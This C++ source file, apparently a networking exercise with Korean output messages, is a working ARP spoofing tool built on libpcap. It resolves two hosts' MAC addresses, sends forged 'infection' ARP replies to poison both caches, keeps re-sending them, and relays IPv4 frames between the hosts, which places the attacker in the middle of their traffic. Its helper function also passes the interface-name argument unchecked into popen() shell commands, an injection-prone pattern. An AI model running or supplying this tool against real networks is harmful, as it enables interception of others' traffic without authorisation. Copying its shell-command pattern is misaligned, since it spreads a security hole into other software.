#include <pcap.h>
#include <unistd.h>
#include <iostream>
#include <cstdlib>
#include <cstring>
#include <netinet/ether.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <thread>
#include "ase_header.h"

using namespace std;
#define PKT_SIZE (sizeof(eth_header)+sizeof(arp_header))

void send_infect_arp(const u_int8_t *pkt_data, u_int8_t chk_first);

uint8_t find_chk_S = 0;
uint8_t find_chk_T = 0;

char FILTER_RULE[BUF_SIZ] = "arp";
pcap_t *use_dev;
struct ether_addr my_mac;
struct sockaddr_in my_ip;
struct sockaddr_in G_Sender_ip;
struct sockaddr_in G_Target_ip;
uint8_t sender_mac[6];
uint8_t target_mac[6];

void err_print(int err_num) {
    switch(err_num) {
    case 0:
        cout <<"사용법: ARP_Spoofing [인터페이스] [Sender_IP] [Target_IP]" <<endl;
        break;
    case 1:
        cout <<"[ERROR] pcap_open_live 실패!" <<endl;
        break;
    case 2:
        cout <<"[ERROR] pcap_compile 실패!" <<endl;
        break;
    case 3:
        cout <<"[ERROR] pcap_setfilter 실패!" <<endl;
        break;
    case 4:
        cout <<"[ERROR] 스레드 생성 실패!" <<endl;
        break;
    default:
        cout <<"알 수 없는 에러 발생!" <<endl;
        break;
    }
}

void init_dev(char *dev_name) {
    char errbuf[ERRBUF_SIZ];
    struct bpf_program rule_struct;
    bpf_u_int32 netmask, ip;

    if (pcap_lookupnet(dev_name, &ip, &netmask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev_name, errbuf);
        netmask = 0xffffff00;  // fallback
    }

    if ((use_dev = pcap_open_live(dev_name, SNAPLEN, 1, 1000, errbuf)) == NULL) {
        err_print(1); exit(1);
    }

    if (pcap_compile(use_dev, &rule_struct, FILTER_RULE, 1, netmask) < 0) {
        err_print(2); exit(1);
    }

    if (pcap_setfilter(use_dev, &rule_struct) < 0) {
        err_print(3); exit(1);
    }

    cout << ":: DEVICE SETTING SUCCESS ::" << endl;
}

void find_me(char *dev_name) {
    FILE *ptr;
    char MAC[20], IP[64] = {0}, cmd[256] = {0};

    // MAC 주소 수집
    sprintf(cmd, "cat /sys/class/net/%s/address", dev_name);
    ptr = popen(cmd, "r");
    fgets(MAC, sizeof(MAC), ptr);
    MAC[strcspn(MAC, "\n")] = '\0';
    pclose(ptr);
    ether_aton_r(MAC, &my_mac);

    // IP 주소 수집
    sprintf(cmd, "ip addr show %s | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1", dev_name);
    ptr = popen(cmd, "r");
    fgets(IP, sizeof(IP), ptr);
    pclose(ptr);
    inet_aton(IP, &my_ip.sin_addr);

    printf("내 MAC 주소: %s\n", MAC);
    printf("내 IP 주소 : %s\n", IP);
}

void send_Req_arp(char *sender_ip, char *target_ip) {
    struct mine m;
    uint8_t packet[PKT_SIZE];
    inet_aton(target_ip, &G_Target_ip.sin_addr);
    inet_aton(sender_ip, &G_Sender_ip.sin_addr);

    while (!find_chk_T || !find_chk_S) {
        memcpy(m.src_mac, my_mac.ether_addr_octet, 6);
        memcpy(m.s_mac, my_mac.ether_addr_octet, 6);
        m.oper = 0x0100;
        m.s_ip = my_ip.sin_addr;

        m.t_ip = G_Sender_ip.sin_addr;
        memcpy(packet, &m, PKT_SIZE);
        pcap_sendpacket(use_dev, packet, PKT_SIZE);

        m.t_ip = G_Target_ip.sin_addr;
        memcpy(packet, &m, PKT_SIZE);
        pcap_sendpacket(use_dev, packet, PKT_SIZE);

        sleep(1);
    }
}

void find_mac(const uint8_t *pkt_data, char *sender_ip, char *target_ip) {
    struct arp_header *ah = (struct arp_header *)pkt_data;
    struct sockaddr_in sender, target;
    inet_aton(sender_ip, &sender.sin_addr);
    inet_aton(target_ip, &target.sin_addr);

    if (ah->s_ip.s_addr == sender.sin_addr.s_addr && !find_chk_S) {
        memcpy(sender_mac, ah->s_mac, sizeof(ah->s_mac));
        printf("Sender MAC 발견: ");
        for (int i = 0; i < 6; i++) printf("%02X ", sender_mac[i]);
        printf("\n");
        find_chk_S = 1;
    }

    if (ah->s_ip.s_addr == target.sin_addr.s_addr && !find_chk_T) {
        memcpy(target_mac, ah->s_mac, sizeof(ah->s_mac));
        printf("Target MAC 발견: ");
        for (int i = 0; i < 6; i++) printf("%02X ", target_mac[i]);
        printf("\n");
        find_chk_T = 1;
    }

    if (find_chk_S && find_chk_T)
        send_infect_arp(pkt_data, 1);
}

void send_infect_arp(const u_int8_t *pkt_data, u_int8_t chk_first) {
    struct mine m_S, m_T;
    struct eth_header *eh = (struct eth_header *)pkt_data;
    uint8_t packet[PKT_SIZE];

    memcpy(m_S.des_mac, sender_mac, 6);
    memcpy(m_S.src_mac, my_mac.ether_addr_octet, 6);
    m_S.s_ip = G_Target_ip.sin_addr;
    memcpy(m_S.s_mac, my_mac.ether_addr_octet, 6);
    m_S.t_ip = G_Sender_ip.sin_addr;
    memcpy(m_S.t_mac, sender_mac, 6);

    memcpy(m_T.des_mac, target_mac, 6);
    memcpy(m_T.src_mac, my_mac.ether_addr_octet, 6);
    m_T.s_ip = G_Sender_ip.sin_addr;
    memcpy(m_T.s_mac, my_mac.ether_addr_octet, 6);
    m_T.t_ip = G_Target_ip.sin_addr;
    memcpy(m_T.t_mac, target_mac, 6);

    if (chk_first) {
        memcpy(packet, &m_S, PKT_SIZE);
        pcap_sendpacket(use_dev, packet, PKT_SIZE);
        memcpy(packet, &m_T, PKT_SIZE);
        pcap_sendpacket(use_dev, packet, PKT_SIZE);
        cout << "ARP 감염 패킷 전송 완료\n";
    }

    if (!memcmp(eh->src_mac, sender_mac, 6) || !memcmp(eh->src_mac, target_mac, 6)) {
        memcpy(packet, &m_S, PKT_SIZE);
        pcap_sendpacket(use_dev, packet, PKT_SIZE);
        memcpy(packet, &m_T, PKT_SIZE);
        pcap_sendpacket(use_dev, packet, PKT_SIZE);
        cout << "ARP 감염 유지 패킷 재전송\n";
    }
}

void pkt_relay(const u_int8_t *pkt_data, bpf_u_int32 caplen) {
    struct eth_header *eh = (struct eth_header *)pkt_data;

    if (!memcmp(eh->src_mac, sender_mac, 6)) {
        memcpy(eh->src_mac, my_mac.ether_addr_octet, 6);
        memcpy(eh->des_mac, target_mac, 6);
        cout << "[Relay] Sender → Target" << endl;
    }
    else if (!memcmp(eh->src_mac, target_mac, 6)) {
        memcpy(eh->src_mac, my_mac.ether_addr_octet, 6);
        memcpy(eh->des_mac, sender_mac, 6);
        cout << "[Relay] Target → Sender" << endl;
    }

    pcap_sendpacket(use_dev, pkt_data, caplen);
}

void cap_pkt(char *sender_ip, char *target_ip) {
    struct pcap_pkthdr *header;
    const uint8_t *pkt_data;
    int res;
    struct eth_header *eh;
    u_int16_t eth_type;

    while ((res = pcap_next_ex(use_dev, &header, &pkt_data)) >= 0) {
        if (res == 0) continue;

        eh = (struct eth_header *)pkt_data;
        eth_type = ntohs(eh->eth_type);

        if (find_chk_S && find_chk_T && eth_type == 0x0806)
            send_infect_arp(pkt_data, 0);
        else if (find_chk_S && find_chk_T && eth_type == 0x0800)
            pkt_relay(pkt_data, header->caplen);

        pkt_data += sizeof(struct eth_header);
        if (!find_chk_S || !find_chk_T)
            find_mac(pkt_data, sender_ip, target_ip);
    }
}

int main(int argc, char **argv) {
    if (argc != 4) {
        err_print(0);
        return -1;
    }

    find_me(argv[1]);
    init_dev(argv[1]);

    thread t1(cap_pkt, argv[2], argv[3]);
    send_Req_arp(argv[2], argv[3]);

    t1.join();
    pcap_close(use_dev);
}
